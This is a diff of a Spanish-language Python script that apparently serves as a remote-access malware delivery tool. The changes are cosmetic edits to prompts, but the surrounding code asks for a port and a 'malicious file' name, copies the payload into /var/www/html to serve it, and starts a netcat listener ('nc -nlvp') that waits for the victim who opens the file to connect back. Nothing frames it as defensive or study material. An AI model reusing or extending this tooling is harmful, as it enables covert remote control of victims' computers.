@@ -29,7 +29,7 @@ def clearScr():
 def option_listener_yes(): 
      clearScr()
      print(""+ rojo +"No cierre esta terminal, cuando la victima habra el archivo se habra conectado a la maquina remotamente."+ fin +"")
-     print(""+ negrita +"UNA VEZ REALIZADA UNA SESION PONGA EL SIGUIENTE COMANDO EN LA TERMINAL > "+ comentarios +" <"+ negrita +" para utilizar la interfaz de comandos")
+     print("\n"+ negrita +"UNA VEZ REALIZADA UNA SESION PONGA EL SIGUIENTE COMANDO EN LA TERMINAL > "+ comentarios +" <"+ negrita +" para utilizar la interfaz de comandos")
      os.system('nc -nlvp '+ puerto +'') 
 
 
@@ -63,11 +63,12 @@ if numero == 1:
    puerto = input("""
    Introduzca un puerto {ejemplo: 4444}
    
-   >  """)
+   >>  """)
 
    name_malware = input("""
    Nombre del archivo malicioso
-   >  """)
+   
+   >>>  """)
    
    os.system('cp '+ path_autoshell +' /var/www/html')
 
